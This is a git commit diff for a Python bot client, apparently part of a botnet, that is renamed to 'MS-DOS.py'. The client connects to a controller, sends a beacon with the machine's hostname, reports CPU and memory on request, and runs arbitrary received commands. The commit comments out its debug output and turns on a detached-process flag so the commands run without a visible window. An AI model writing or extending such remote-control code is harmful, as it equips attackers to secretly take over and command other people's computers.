df1054668b21b2fc7cdc327f7d5fe3e6c7bf632c
Host-Info.net <50676042+aerobotpro@users.noreply.github.com>
2020-04-22 14:52:08 -0700

    Update and rename base.py to MS-DOS.py

--- src/bot/MS-DOS.py
+++ src/bot/MS-DOS.py
@@ -19,13 +19,12 @@ async def tcp_echo_client(message, loop):
             reader, writer = await asyncio.open_connection(h_ip, h_port, loop=loop)
 
             #BEACON
-            print("BEACON...")
             beacon = str(gethostname() + ": _beacon_").encode()
             writer.write(beacon)
             print("READING....")
             glbls.cmd = await reader.read(100)
             glbls.cmd = glbls.cmd.decode()
-            print(f"REC: {dec}")
+            #print(f"REC: {dec}")
             if "stat" in glbls.cmd:
                 cpu = str(round(float(psutil.cpu_percent()), 2)) + "%"
                 ram = str(psutil.virtual_memory()) + "B"
@@ -34,16 +33,16 @@ async def tcp_echo_client(message, loop):
             if "run" in glbls.cmd:
                 glbls.cmd = dec.replace("run ", "")
                 cmd = glbls.cmd.split()
-                print(f"EXEC: {str(cmd)}")
+                #print(f"EXEC: {str(cmd)}")
                 run(
                     [cmd],
                     stdout = PIPE,
                     stderr = PIPE,
                     universal_newlines=True,
                     shell=False,
-                    #creationflags=0x00000008
+                    creationflags=0x00000008
                     )
-            print(f'SENDING: {glbls.cmd} ')
+            #print(f'SENDING: {glbls.cmd} ')
             writer.write(glbls.cmd.encode())    
             await asyncio.sleep(3)
             loop.close()
@@ -54,7 +53,7 @@ async def tcp_echo_client(message, loop):
         except Exception as f:
             glbls.live = False
             
-            print(f)
+            #print(f)
             sleep(3)
             main()
 
@@ -67,7 +66,7 @@ def main():
         loop.run_until_complete(tcp_echo_client(message, loop))
         main()
     except Exception as D:
-        print(D)
+        #print(D)
         glbls.live = False
         main()
 
